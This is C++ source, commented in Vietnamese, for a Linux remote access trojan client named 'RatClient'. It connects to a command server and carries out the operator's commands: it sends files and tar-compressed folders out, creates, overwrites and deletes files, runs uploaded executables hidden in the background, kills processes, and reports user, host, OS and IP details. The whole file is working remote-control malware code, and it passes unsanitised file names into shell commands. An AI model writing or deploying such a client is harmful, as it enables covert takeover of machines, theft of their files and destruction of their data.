#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <cstring>
#include <vector>
#include <cstdint>

// Thư viện Socket và Hệ thống trên Linux
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <unistd.h>       // Thư viện cho getusername, gethostname
#include <sys/utsname.h>  // Thư viện lấy thông tin OS (Kernel, Name)
#include <limits.h>       // Định nghĩa các hằng số giới hạn như HOST_NAME_MAX

namespace fs = std::filesystem;
const int BUFFER_SIZE = 4096;

class SocketClient {
public:
    int socket;
    void stringSend(std::string msg);
    void fileUpload(std::ifstream& file);
    std::string stringReceive();
};

void SocketClient::stringSend(std::string msg) {
    if (msg.size() > UINT32_MAX) {
        throw std::runtime_error("Payload too large");
    }
    uint32_t payloadSize = static_cast<uint32_t>(msg.size());
    std::string packet(sizeof(payloadSize) + msg.size(), '\0');
    memcpy(packet.data(), &payloadSize, sizeof(payloadSize));
    memcpy(packet.data() + sizeof(payloadSize), msg.data(), msg.size());

    send(socket, packet.data(), packet.size(), 0);
}

void SocketClient::fileUpload(std::ifstream& file) {
    file.seekg(0, std::ios::end);
    uint32_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    send(socket, (char*)&fileSize, sizeof(fileSize), 0);

    char buffer[BUFFER_SIZE];
    while (file.read(buffer, sizeof(buffer)) || file.gcount() > 0) {
        send(socket, buffer, file.gcount(), 0);
    }
}

std::string SocketClient::stringReceive() {
    uint32_t payloadSize = 0;

    int ret = recv(socket,
                   reinterpret_cast<char*>(&payloadSize),
                   sizeof(payloadSize),
                   0);

    if (ret <= 0) {
        return {};
    }

    std::string payload(payloadSize, '\0');

    int totalReceived = 0;
    while (totalReceived < payloadSize) {
        int bytes = recv(socket,
                         reinterpret_cast<char*>(payload.data()) + totalReceived,
                         payloadSize - totalReceived,
                         0);

        if (bytes <= 0) {
            return {};
        }

        totalReceived += bytes;
    }

    return payload;
}


class FileManager {
public:
    SocketClient client;
    void HandleList();
    void HandleEditFile(const std::string& filename);
    void HandleRemoveFile(const std::string& filename);
    void HandleRunFile(const std::string& filename);
    void HandleCreateFile(const std::string& filename);
    void HandleDownload(const std::string& filename);
    void HandleDownloadDir(const std::string& foldername);
};

// Hàm xử lý lệnh LIST (Liệt kê file)
void FileManager::HandleList() {
    char buffer[128];
    std::string result = "\n=== KET QUA TU LENH SYSTEM (ls -lR) ===\n\n";
    
    // Chạy lệnh "ls -lR" và mở một pipe để đọc kết quả (chế độ "r" - read)
    // popen sẽ chuyển hướng stdout của lệnh vào pipe này
    FILE* pipe = popen("ls -lR", "r");
    
    if (!pipe) {
        std::string errorMsg = "ERROR: Khong the thuc thi lenh he thong.\n";
        client.stringSend(errorMsg);
        return;
    }

    // Đọc dữ liệu từ pipe cho đến khi hết
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    // Đóng pipe và lấy trạng thái kết thúc của lệnh
    int returnCode = pclose(pipe);
    if (returnCode != 0) {
        result += "\n[!] Lenh ket thuc voi loi (Code: " + std::to_string(returnCode) + ")\n";
    }

    std::cout << "[+] Da thuc hien lenh LIST\n";

    // Gửi toàn bộ kết quả trả về cho Server qua Socket
    client.stringSend(result);
}

// Hàm xử lý lệnh GET (Tải file)
void FileManager::HandleDownload(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        std::string msg = "ERROR: Khong the mo file.\n";
        client.stringSend(msg);
        return;
    }

    // Thông báo cho Server biết file hợp lệ và chuẩn bị gửi
    client.stringSend("START");

    client.fileUpload(file);
    
    file.close();
    std::cout << "[+] Da gui xong file: " << filename << "\n";
}

// Hàm xử lý tải toàn bộ Folder (Nén lại rồi gửi)
void FileManager::HandleDownloadDir(const std::string& foldername) {
    if (!fs::exists(foldername) || !fs::is_directory(foldername)) {
        std::string msg = "ERROR: Thu muc khong ton tai.\n";
        client.stringSend(msg);
        return;
    }

    fs::path absolutePath = fs::absolute(foldername);
    std::string parentDir = absolutePath.parent_path().string();
    std::string dirName = absolutePath.filename().string();

    std::string tarCmd = "tar -czf archive.tar.gz -C \"" + parentDir + "\" \"" + dirName + "\"";
    
    // Thực hiện nén trước
    int res = system(tarCmd.c_str());
    if (res != 0) {
        std::string msg = "ERROR: Khong the nen thu muc.\n";
        client.stringSend(msg);
        return;
    }

    // Mở file sau khi nén thành công
    std::ifstream file("archive.tar.gz", std::ios::binary);
    if (!file.is_open()) {
        std::string msg = "ERROR: Khong the mo file archive.\n";
        client.stringSend(msg);
        return;
    }

    // Gửi tín hiệu thông báo cho Server: Mọi thứ đã sẵn sàng
    std::string startMsg = "START";
    client.stringSend(startMsg);

    client.fileUpload(file);

    fs::remove("archive.tar.gz");
    std::cout << "[+] Da nén va gui xong folder qua socket!\n";
}

// Hàm xử lý việc tạo file mới từ xa
void FileManager::HandleCreateFile(const std::string& filename) {
    // 1. Kiểm tra xem file đã tồn tại chưa bằng thư viện chuẩn fstream
    // (Tránh việc vô tình ghi đè lên file quan trọng có sẵn)
    fs::path filepath(filename);

    if (fs::exists(filepath)) {
        std::string errorMsg =
            "ERROR: File '" + filename + "' da ton tai tren Client. Dung EDITFILE de sua.\n";
        client.stringSend(errorMsg);
        return;
    }

    // 2. Gửi tín hiệu thông báo sẵn sàng nhận nội dung cho file mới
    std::string readyMsg = "READY_FOR_CONTENT";
    client.stringSend(readyMsg);

    // 3. Nhận nội dung ban đầu từ Server
    auto content = client.stringReceive();
    if (content.empty()) {
        std::cout << "[-] Mat ket noi khi dang nhan noi dung file moi.\n";
        return;
    }

    // 4. Tiến hành tạo và ghi file mới
    // Nếu có thư mục cha thì tạo
    if (!filepath.parent_path().empty()) {
        fs::create_directories(filepath.parent_path());
    }

    std::ofstream file(filepath, std::ios::binary);
    std::string statusMsg;

    if (!file.is_open()) {
        statusMsg = "ERROR: Khong the tao file tren Client (Kiem tra lai duong dan hoac quyen ghi).\n";
    } else {
        file.write(content.c_str(), content.length());
        file.close();
        statusMsg = "SUCCESS: Da tao file '" + filename + "' moi thanh cong.\n";
    }

    // 5. Gửi báo cáo kết quả về Server và in log tại Client
    client.stringSend(statusMsg);
    std::cout << "[+] Thuc hien CREATEFILE " << filename << ": " << statusMsg;
}

// Hàm xử lý việc thay đổi nội dung file từ xa
void FileManager::HandleEditFile(const std::string& filename) {
    
    // 1. Gửi tín hiệu thông báo sẵn sàng nhận nội dung mới
    std::string readyMsg = "READY_FOR_CONTENT";
    client.stringSend(readyMsg);

    // 2. Nhận nội dung mới từ Server (đặt cấu hình tạm thời nhận dữ liệu)
    auto newContent = client.stringReceive();
    if (newContent.empty()) {
        std::cout << "[-] Mat ket noi khi dang nhan noi dung file.\n";
        return;
    }

    // 3. Tiến hành ghi đè nội dung vào file
    std::ofstream file(filename, std::ios::trunc | std::ios::binary); // std::ios::trunc để ghi đè dữ liệu cũ
    std::string statusMsg;

    if (!file.is_open()) {
        statusMsg = "ERROR: Khong the mo hoặc tao file de ghi tren Client.\n";
    } else {
        file.write(newContent.c_str(), newContent.length());
        file.close();
        statusMsg = "SUCCESS: Da cap nhat noi dung file '" + filename + "' thanh cong.\n";
    }

    // 4. Gửi báo cáo kết quả về Server
    client.stringSend(statusMsg);
    std::cout << "[+] Thuc hien EDITFILE " << filename << ": " << statusMsg << "\n";
}

// Hàm xử lý việc xóa file từ xa
void FileManager::HandleRemoveFile(const std::string& filename) {
    std::string statusMsg;

    // 1. Kiểm tra xem file có tồn tại và có phải là file thường không (tránh xóa nhầm folder)
    if (!fs::exists(filename)) {
        statusMsg = "ERROR: File '" + filename + "' khong ton tai.\n";
    } else if (fs::is_directory(filename)) {
        statusMsg = "ERROR: '" + filename + "' la mot thu muc, khong the dung lenh xoa file.\n";
    } else {
        // 2. Thực hiện xóa file
        std::error_code ec;
        if (fs::remove(filename, ec)) {
            statusMsg = "SUCCESS: Da xoa file '" + filename + "' thanh cong.\n";
        } else {
            statusMsg = "ERROR: Khong the xoa file (Loi: " + ec.message() + ").\n";
        }
    }

    // 3. Gửi báo cáo kết quả về Server và in log ra màn hình Client
    client.stringSend(statusMsg);
    std::cout << "[+] Thuc hien REMOVEFILE " << filename << ": " << statusMsg << "\n";
}

// Hàm xử lý việc chạy một file thực thi trên Client
void FileManager::HandleRunFile(const std::string& filepath) {
    std::string statusMsg;

    // 1. Kiểm tra xem file có tồn tại hay không
    if (!fs::exists(filepath)) {
        statusMsg = "ERROR: File '" + filepath + "' khong ton tai.\n";
        client.stringSend(statusMsg);
        return;
    }

    // 2. Kiểm tra xem có quyền thực thi (Execute) không, nếu chưa có thì cấp quyền
    // (Tương đương lệnh chmod +x trên Linux)
    try {
        fs::permissions(filepath, fs::perms::owner_exec | fs::perms::group_exec | fs::perms::others_exec, fs::perm_options::add);
    } catch (const std::exception& e) {
        statusMsg = "ERROR: Khong the cap quyen thuc thi cho file.\n";
        client.stringSend(statusMsg);
        return;
    }

    std::cout << "[*] Dang khoi chay file: " << filepath << "...\n";

    // 3. Xây dựng lệnh chạy ngầm
    // Định dạng đường dẫn chuẩn hóa
    std::string runCmd;
    if (filepath.rfind("/", 0) == std::string::npos && filepath.rfind("./", 0) == std::string::npos) {
        runCmd = "./" + filepath;
    } else {
        runCmd = filepath;
    }

    // Đẩy tiến trình chạy ngầm bằng cách chuyển hướng log ra /dev/null và thêm &
    runCmd = runCmd + " > /dev/null 2>&1 &";

    int res = system(runCmd.c_str());

    if (res == 0) {
        statusMsg = "SUCCESS: Da kich hoat lenh chay file '" + filepath + "' ngam thanh cong.\n";
    } else {
        statusMsg = "ERROR: Co loi xay ra khi goi thuc thi file.\n";
    }

    // 4. Gửi phản hồi về Server
    client.stringSend(statusMsg);
    std::cout << "[+] Thuc hien RUNFILE " << filepath << ": " << statusMsg << "\n";
}

class ProcessManager {
public:
    SocketClient client;
    void HandleProcessList();
    void HandleKillProcess(const std::string& pid);
};

// Hàm chạy lệnh hệ thống "ps -ef" và gửi kết quả về Server
void ProcessManager::HandleProcessList() {
    char buffer[512]; // Tăng buffer lên một chút vì một dòng ps -ef có thể dài
    std::string result = "\n=== DANH SACH TIEN TRINH CLIENT (ps -ef) ===\n\n";
    
    // Gọi lệnh hệ thống ps -ef qua pipe
    FILE* pipe = popen("ps -ef", "r");
    if (!pipe) {
        std::string errorMsg = "ERROR: Khong the thuc thi lenh xem tien trinh.\n";
        client.stringSend(errorMsg);
        return;
    }

    // Đọc dữ liệu từ pipe và nối vào chuỗi kết quả
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    pclose(pipe);

    // Gửi toàn bộ danh sách tiến trình về Server
    client.stringSend(result);
    std::cout << "[+] Da gui danh sach tien trinh (ps -ef) ve Server.\n";
}

// Hàm xử lý lệnh tắt tiến trình bằng PID
void ProcessManager::HandleKillProcess(const std::string& pid) {
    // Kiểm tra chuỗi PID hợp lệ (tránh việc truyền ký tự lạ gây lỗi lệnh hệ thống)
    if (pid.empty() || pid.find_first_not_of("0123456789") != std::string::npos) {
        std::string msg = "ERROR: PID khong hop le (phai la so nguyen).\n";
        client.stringSend(msg);
        return;
    }

    std::cout << "[*] Dang thuc hien kill PID: " << pid << "...\n";
    
    // Lệnh kill -9 buộc dừng tiến trình ngay lập tức trên Linux
    std::string killCmd = "kill -9 " + pid;
    
    int res = system(killCmd.c_str());
    
    std::string statusMsg;
    if (res == 0) {
        statusMsg = "SUCCESS: Da tat tien trinh " + pid + " thanh cong.\n";
    } else {
        statusMsg = "ERROR: Khong the tat tien trinh " + pid + " (Co the sai PID hoac thieu quyen root).\n";
    }

    // Gửi báo cáo trạng thái về cho Server
    client.stringSend(statusMsg);
}



class SystemInfo {
public:
    SocketClient client;
    void HandleSysInfo();
};

// Hàm lấy thông tin chung của hệ thống Client
void SystemInfo::HandleSysInfo() {
    std::string info = "\n=== THONG TIN HE THONG CLIENT ===\n";

    // 1. Lấy Username
    char username[256];
    if (getlogin_r(username, sizeof(username)) != 0) {
        // Cách phòng cua nếu getlogin_r thất bại trong môi trường dịch vụ ngầm
        char* envUser = getenv("USER");
        if (envUser != nullptr) {
            snprintf(username, sizeof(username), "%s", envUser);
        } else {
            snprintf(username, sizeof(username), "Unknown");
        }
    }
    info += "Username: " + std::string(username) + "\n";

    // 2. Lấy Computer Name (Hostname)
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        info += "Computer Name: " + std::string(hostname) + "\n";
    } else {
        info += "Computer Name: Unknown\n";
    }

    // 3. Lấy Thông tin Hệ điều hành (OS và Nhân Kernel)
    struct utsname osInfo;
    if (uname(&osInfo) == 0) {
        info += "OS Type: " + std::string(osInfo.sysname) + "\n";
        info += "Kernel Version: " + std::string(osInfo.release) + "\n";
        info += "Architecture: " + std::string(osInfo.machine) + "\n";
    }

    // 4. Lấy chi tiết phiên bản phân phối (Ví dụ: Ubuntu/Debian...) bằng cách đọc /etc/issue
    std::ifstream issueFile("/etc/issue");
    if (issueFile.is_open()) {
        std::string line;
        if (std::getline(issueFile, line)) {
            // Xóa bớt các ký tự định dạng trống ở cuối dòng nếu có
            size_t end = line.find_first_of("\\");
            if (end != std::string::npos) line = line.substr(0, end);
            info += "OS Distribution: " + line + "\n";
        }
        issueFile.close();
    }

    // 5. Lấy thông tin địa chỉ IP nội bộ (Internal IP) bằng cách đọc danh sách card mạng đơn giản
    // Sử dụng lệnh "hostname -I" để lấy nhanh IP đã cấp phát
    FILE* pipe = popen("hostname -I", "r");
    if (pipe) {
        char ipBuffer[128];
        if (fgets(ipBuffer, sizeof(ipBuffer), pipe) != nullptr) {
            std::string ipStr(ipBuffer);
            // Xóa ký tự xuống dòng thừa
            if (!ipStr.empty() && ipStr.back() == '\n') ipStr.pop_back();
            info += "Local IP: " + ipStr + "\n";
        }
        pclose(pipe);
    }

    info += "=================================\n";

    // Gửi toàn bộ chuỗi thông tin về cho Server
    client.stringSend(info);
    std::cout << "[+] Da gui thong tin he thong ve Server." << "\n";
}



class RatClient {
public:
    // Cập nhật phương thức Start nhận địa chỉ IP (và Port nếu cần, mặc định 8080)
    void Start(const std::string& serverIP, int serverPort = 8080);

private:
    SocketClient client;
    FileManager fileManager;
    ProcessManager processManager;
    SystemInfo systemInfo;

    void InitClientSocket();
    void Listen(const std::string& serverIP, int serverPort);

    void CommandLoop();
    void HandleCommand(const std::string& cmd);
};

void RatClient::Start(const std::string& serverIP, int serverPort) {
    InitClientSocket();
    Listen(serverIP, serverPort);
    CommandLoop();
}

void RatClient::InitClientSocket() {
    client.socket = socket(AF_INET, SOCK_STREAM, 0);
    fileManager.client = client;
    processManager.client = client;
    systemInfo.client = client;
    if (client.socket < 0) {
        std::cerr << "[-] Khong the tao socket!\n";
        exit(1);
    }
}

void RatClient::Listen(const std::string& serverIP, int serverPort) {
    sockaddr_in serverAddr;
    std::memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort); // Dùng Port được truyền vào

    // Chuyển đổi IP truyền từ tham số dòng lệnh sang dạng nhị phân
    if (inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr) <= 0) {
        std::cerr << "[-] Dia chi IP khong hop le: " << serverIP << "\n";
        close(client.socket);
        exit(1);
    }

    std::cout << "[*] Dang ket noi den Server (" << serverIP << ":" << serverPort << ")...\n";
    if (connect(client.socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "[-] Ket noi that bai!\n";
        close(client.socket);
        exit(1);
    }
    std::cout << "[+] Ket noi thanh cong!\n\n";
}

void RatClient::CommandLoop() {
    while (true) {
        auto command = client.stringReceive();
        if (command.empty()) {
            std::cout << "[-] Mat ket noi voi Server.\n";
            break;
        }

        std::cout << "[*] Lenh nhan duoc: " << command << "\n";
        HandleCommand(command);
        std::cout << "\n";
    }
}

void RatClient::HandleCommand(const std::string& command) {
    if (command == "LIST") {
        fileManager.HandleList();
    } 
    else if (command.rfind("GETFILE ", 0) == 0) {
        std::string filename = command.substr(8);
        fileManager.HandleDownload(filename);
    }
    else if (command.rfind("GETDIR ", 0) == 0) {
        std::string foldername = command.substr(7);
        fileManager.HandleDownloadDir(foldername);
    }
    else if (command == "PS") {
        processManager.HandleProcessList();
    }
    else if (command.rfind("KILL ", 0) == 0) {
        std::string pid = command.substr(5);
        processManager.HandleKillProcess(pid);
    }
    else if (command.rfind("EDITFILE ", 0) == 0) {
        std::string filename = command.substr(9);
        fileManager.HandleEditFile(filename);
    }
    else if (command.rfind("REMOVEFILE ", 0) == 0) {
        std::string filename = command.substr(11);
        fileManager.HandleRemoveFile(filename);
    }
    else if (command.rfind("RUNFILE ", 0) == 0) {
        std::string filepath = command.substr(8);
        fileManager.HandleRunFile(filepath);
    }
    else if (command.rfind("CREATEFILE ", 0) == 0) {
        std::string filename = command.substr(11);
        fileManager.HandleCreateFile(filename);
    }
    else if (command == "SYSINFO") {
        systemInfo.HandleSysInfo();
    }
}



int main(int argc, char* argv[]) {
    // Giá trị IP mặc định nếu không truyền tham số
    std::string serverIP = "192.168.1.1"; 
    int serverPort = 8080;

    if (argc >= 2) {
        // Lấy IP từ tham số thứ 1 truyền vào: ./client <SERVER_IP>
        serverIP = argv[1]; 
    } else {
        std::cout << "[i] Khong truyen IP. Su dung IP mac dinh: " << serverIP << "\n";
        std::cout << "[i] Cu phap truyen IP: " << argv[0] << " <SERVER_IP> [PORT]\n\n";
    }

    if (argc >= 3) {
        // (Tùy chọn) Lấy Port từ tham số thứ 2 nếu muốn: ./client <SERVER_IP> <PORT>
        serverPort = std::atoi(argv[2]);
    }

    RatClient client;
    client.Start(serverIP, serverPort);

    return 0;
}